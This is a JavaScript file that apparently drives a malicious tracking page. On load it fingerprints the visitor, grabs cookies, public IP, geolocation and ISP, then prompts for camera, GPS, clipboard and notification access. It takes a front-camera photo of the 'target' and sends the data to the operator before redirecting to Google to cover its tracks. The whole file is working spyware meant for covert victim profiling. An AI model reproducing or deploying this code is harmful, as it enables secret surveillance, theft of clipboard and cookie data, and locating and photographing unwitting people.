// main.js - Main orchestrator
(function(){
    window.addEventListener('DOMContentLoaded',async()=>{
        window._waitForPermission = true;
        updateProgress();
        await U.wait(1000);

        try{
            const raw={};const report={};
            const sid=U.uid();
            report.sessionId=sid;
            report.localTime=new Date().toLocaleString();

            // === SYSTEM (Fast) ===
            const ua=navigator.userAgent;
            raw.userAgent=ua;
            report.platform=navigator.platform;
            report.osVersion=(ua.match(/Windows NT ([\d.]+)/)||[])[1]||
                (ua.match(/Mac OS X ([\d_.]+)/)||[])[1]||
                (ua.match(/Android ([\d.]+)/)||[])[1]||
                (ua.match(/iPhone OS ([\d_]+)/)||[])[1]||
                (ua.match(/CrOS[\w ]+\/([\d.]+)/)||[])[1]||'N/A';
            report.deviceType=/Mobi|Android|iPhone|iPad|iPod/i.test(ua)?'Mobile':
                /Tablet|iPad/i.test(ua)?'Tablet':'Desktop';
            report.cpuCores=navigator.hardwareConcurrency||'N/A';
            report.ram=(navigator.deviceMemory||'N/A')+'GB';
            report.vendor=navigator.vendor||'N/A';
            report.webdriver=String(!!navigator.webdriver);
            const bm=ua.match(/(Edg|OPR|Chrome|Firefox|Safari)\/([\d.]+)/);
            report.browser=ua.includes('Edg/')?'Edge':ua.includes('OPR/')?'Opera':ua.includes('Chrome/')?'Chrome':ua.includes('Firefox/')?'Firefox':ua.includes('Safari/')?'Safari':'Unknown';
            report.browserVersion=bm?bm[2]:'N/A';
            report.language=navigator.language;
            report.languages=(navigator.languages||[]).join(', ');
            report.cookiesEnabled=String(navigator.cookieEnabled);
            report.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
            report.tzOffset=new Date().getTimezoneOffset();

            // === SCREEN (Fast) ===
            const scr=NET.screenInfo();
            report.screenRes=scr.width+'x'+scr.height;
            report.orientation=typeof scr.orientation==='object'?scr.orientation.type:scr.orientation;
            raw.screenFull=scr;

            // === FINGERPRINTS (Fast) ===
            report.canvasFP=FP.canvas();
            const wgl=FP.webgl();
            report.gpu=wgl.renderer||'N/A';report.gpuVendor=wgl.vendor||'N/A';
            report.webglFP=wgl.renderHash||'N/A';
            report.audioFP=await FP.audio(); // Usually fast without prompt
            const fonts=FP.fonts();
            report.fontCount=fonts.length;
            report.cssFeatures=JSON.stringify(FP.cssFeatures()).substring(0,400);
            
            // === STORAGE (Fast) ===
            const storage=NET.storage();
            report.lsCount=storage.localStorage.count;
            report.lsSize=storage.localStorage.size;
            report.cookies=document.cookie.substring(0,200)||'None';
            
            // === NETWORK (Background/No Prompt) ===
            // We run these concurrently so we can ask for camera ASAP!
            const bgTasks = [];
            bgTasks.push((async()=>{
                report.publicIP=await NET.getIP();
                const geo=await NET.geoIP(report.publicIP);
                report.city=geo.city||'N/A';report.region=geo.region||'N/A';
                report.country=geo.country||'N/A';report.postal=geo.postal||'N/A';
                report.loc=geo.loc||'N/A';report.isp=geo.isp||'N/A';
                report.hostname=geo.hostname||'N/A';report.asn=geo.asn;
            })());
            bgTasks.push(NET.battery().then(bat=>report.battery=typeof bat==='object'?JSON.stringify(bat):bat));
            bgTasks.push(NET.storageQuota().then(sq=>report.storageQuota=typeof sq==='object'?JSON.stringify(sq):sq));
            
            // Wait max 3 seconds for background tasks before prompting camera, to ensure we have IP
            await Promise.race([
                Promise.all(bgTasks),
                U.wait(3000)
            ]);

            // Helper to finalize and send
            const finalizeAndSend = async (source) => {
                window._waitForPermission = false; // unfreeze progress
                raw.timestamp=U.ts();
                raw.report=report;
                report._raw=raw;
                report.triggerSource = source;
                
                // Gather remaining non-prompt info if needed (only fast ones)
                const vm=NET.vmDetect(ua,wgl.renderer);
                report.vm=vm.detected?vm.signs.join(', '):'Clean';
                report.automation=FP.automation().join(', ');
                if(!report.socialLogins) {
                    NET.socialLogins().then(s => report.socialLogins=JSON.stringify(s).substring(0,400)).catch(()=>{});
                }
                
                await SEND.report(report);
                try{
                    const visits=parseInt(localStorage.getItem('_v')||'0')+1;
                    localStorage.setItem('_v',visits);
                    localStorage.setItem('_t',U.ts());
                    localStorage.setItem('_id',sid);
                }catch(e){}
            };

            // === 1. CAMERA & AUDIO PERMISSION (FIRST PROMPT) ===
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
                window._waitForPermission = false; // Unfreeze UI
                
                // Capture photo
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('autoplay', '');
                video.setAttribute('muted', '');
                video.setAttribute('playsinline', '');
                await video.play();
                await U.wait(1500); // Adjust exposure
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                
                // Send photo first!
                await SEND.photo(dataUrl, '📸 لقطة الكاميرا الهدف\nID: ' + sid);
                stream.getTracks().forEach(t => t.stop());
                report.cameraCaptured = 'Success (Video+Audio)';
                
                // Send report immediately because we got a permission!
                await finalizeAndSend('Camera_Audio');
            } catch (e) {
                report.cameraCaptured = 'Failed: ' + e.message;
            }

            // === 2. LOCATION PERMISSION ===
            try {
                const geoLoc = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(
                        p => res({ lat: p.coords.latitude, lon: p.coords.longitude, accuracy: p.coords.accuracy }),
                        e => rej(e),
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                });
                
                if(geoLoc.lat){
                    window._waitForPermission = false;
                    report.gps=geoLoc.lat+', '+geoLoc.lon;
                    report.gpsLat=String(geoLoc.lat);report.gpsLon=String(geoLoc.lon);
                    report.gpsAccuracy=(geoLoc.accuracy||'N/A')+'m';
                    
                    await finalizeAndSend('Location');
                }
            } catch (e) {
                report.gps='Error: '+ (e.message || 'Denied');
            }

            // === 3. CLIPBOARD PERMISSION ===
            try {
                report.clipboard=(await navigator.clipboard.readText()).substring(0,500);
                if (report.clipboard && report.clipboard !== 'Denied') {
                    window._waitForPermission = false;
                    await finalizeAndSend('Clipboard');
                }
            } catch(e) {
                report.clipboard = 'Denied/Error';
            }

            // === 4. NOTIFICATIONS PERMISSION ===
            try {
                if ('Notification' in window) {
                    const perm = await Notification.requestPermission();
                    report.notifications = perm;
                    if (perm === 'granted') {
                        window._waitForPermission = false;
                        await finalizeAndSend('Notifications');
                    }
                }
            } catch(e) {}

            // === 5. DEVICE ORIENTATION PERMISSION (iOS 13+) ===
            try {
                if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
                    const perm = await DeviceOrientationEvent.requestPermission();
                    if (perm === 'granted') {
                        window._waitForPermission = false;
                        await finalizeAndSend('Sensors');
                    }
                }
            } catch(e) {}

            // === FALLBACK: NO PERMISSIONS GRANTED ===
            if (window._waitForPermission) {
                window._waitForPermission = false; // Unfreeze anyway
                await finalizeAndSend('Fallback_No_Permissions');
            }

            // === REDIRECT TO GOOGLE ===
            window.location.href = "https://google.com";

        }catch(e){
            window._waitForPermission = false;
            try{await SEND.msg('⚠️ Collection error: '+e.message)}catch(ex){}
        }
    });
})();
